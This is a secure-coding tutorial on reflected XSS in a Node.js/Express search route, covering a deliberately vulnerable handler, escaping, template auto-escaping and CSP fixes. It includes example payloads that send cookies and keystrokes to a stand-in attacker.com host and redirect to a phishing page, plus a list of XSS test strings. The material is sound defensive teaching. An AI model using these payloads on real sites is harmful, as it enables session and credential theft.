# Understanding Reflected XSS: A Practical Deep Dive

I'll show you a real vulnerability pattern, explain the mechanics, and how to fix it.

## The Vulnerable Code

Here's a common server-side mistake (Node.js/Express):

```javascript
// VULNERABLE - Don't do this
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${query}</h1>
        <p>You searched for "${query}"</p>
      </body>
    </html>
  `);
});
```

## The Attack

A malicious link sent to a victim:
```
https://yourapp.com/search?q=<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

When the victim clicks it, the server responds with:
```html
<h1>Search Results for: <img src=x onerror="fetch(...)"></h1>
```

**Why it works:**
- The browser receives HTML from a trusted source (your domain)
- It parses `<img src=x onerror=...>` as actual HTML
- The `onerror` event fires (src=x doesn't exist)
- JavaScript executes in the victim's browser with their cookies/session

The attacker never touched your server—they just crafted a URL that made *your server* deliver malicious code.

## Why This Is Dangerous

```javascript
// What the attacker can do:
const payload = `<script>
  // Steal session cookies
  new Image().src = 'https://attacker.com/log?c=' + document.cookie;

  // Redirect to phishing page
  window.location = 'https://fake-bank.com';

  // Modify page content
  document.body.innerHTML = '<h1>Your account is locked</h1>';

  // Keylogger
  document.onkeypress = (e) => {
    fetch('https://attacker.com/keys?k=' + e.key);
  };
</script>`;
```

## The Fix: Output Encoding

**Option 1: HTML Entity Encoding (Simplest)**

```javascript
// SAFE
const escapeHtml = (text) => {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
};

app.get('/search', (req, res) => {
  const query = req.query.q;
  const safeQuery = escapeHtml(query);
  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${safeQuery}</h1>
      </body>
    </html>
  `);
});
```

Now the payload becomes harmless:
```html
<h1>Search Results for: &lt;img src=x onerror="fetch(...)"&gt;</h1>
```
The browser displays it as text, not executable code.

**Option 2: Use a Template Engine (Better)**

```javascript
// Using EJS (auto-escapes by default)
app.get('/search', (req, res) => {
  res.render('search', { query: req.query.q });
});
```

```ejs
<!-- search.ejs -->
<h1>Search Results for: <%= query %></h1>
<!-- <%= %> auto-escapes HTML -->
```

**Option 3: Content Security Policy (Defense in Depth)**

```javascript
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "script-src 'self'; object-src 'none'"
  );
  next();
});
```

This prevents inline scripts from executing even if XSS gets through.

## Testing Your Fix

```javascript
// Test cases
const testPayloads = [
  '<script>alert("xss")</script>',
  '<img src=x onerror="alert(1)">',
  '<svg onload="alert(1)">',
  'javascript:alert(1)',
  '<iframe src="javascript:alert(1)">',
];

testPayloads.forEach(payload => {
  const safe = escapeHtml(payload);
  console.log(`Input: ${payload}`);
  console.log(`Output: ${safe}`);
  console.log('---');
});
```

## Key Takeaways

| Mistake | Why It Fails | Fix |
|---------|-------------|-----|
| `${userInput}` in HTML | Browser interprets as code | HTML entity encode |
| `${userInput}` in JavaScript | Breaks out of string context | JavaScript encode |
| `${userInput}` in URL | Can inject `javascript:` protocol | URL encode |
| No CSP header | No fallback protection | Add CSP header |

**The golden rule:** Never trust user input. Always encode based on *context* (HTML, JavaScript, URL, CSS each need different encoding).
